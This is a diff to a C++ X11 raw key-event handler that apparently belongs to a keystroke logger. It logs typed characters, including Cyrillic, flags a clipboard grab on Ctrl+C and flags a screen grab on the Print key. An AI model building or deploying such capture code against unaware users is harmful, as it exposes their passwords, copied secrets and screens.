@@ -3,7 +3,7 @@
 #include "../specialKeysHelper/specialKeysHelper.hpp" 
 #include <cstring> 
 
-KeyPressResult process_key_press(Display* display, XIRawEvent* rawev, const XkbStateRec& state, bool ctrlPressed) {
+KeyPressResult process_key_press(Display* display, XIRawEvent* rawev, const XkbStateRec& state, bool& ctrlPressed) {
     KeyPressResult result;
 
     bool is_shift_pressed = (state.mods & ShiftMask);
@@ -19,8 +19,14 @@ KeyPressResult process_key_press(Display* display, XIRawEvent* rawev, const XkbS
         return result; 
     }
 
-    if(keysym == XK_c || keysym == XK_C && ctrlPressed){
+    if ((keysym == XK_c || keysym == XK_C || keysym == XK_Cyrillic_es || keysym == XK_Cyrillic_ES) && ctrlPressed) {
         result.should_grabBuffer = true;   
+        ctrlPressed = false;
+        return result;
+    }
+
+    if (keysym == XK_Print) {
+        result.should_grabScreen = true;
         return result;
     }
 
@@ -39,11 +45,14 @@ KeyPressResult process_key_press(Display* display, XIRawEvent* rawev, const XkbS
             ctrlPressed = true;
         } 
     } else {
+        ctrlPressed = false;
         const char* cyrillic_char = keysym_to_utf8_cyrillic(keysym);
         if (cyrillic_char) {
             result.char_to_log = cyrillic_char;
             result.printable_name = cyrillic_char;
         } else {
+            
+
             const char* key_name = XKeysymToString(keysym);
             result.printable_name = key_name;
 
@@ -52,6 +61,5 @@ KeyPressResult process_key_press(Display* display, XIRawEvent* rawev, const XkbS
             }
         }
     }
-    
     return result;
 }
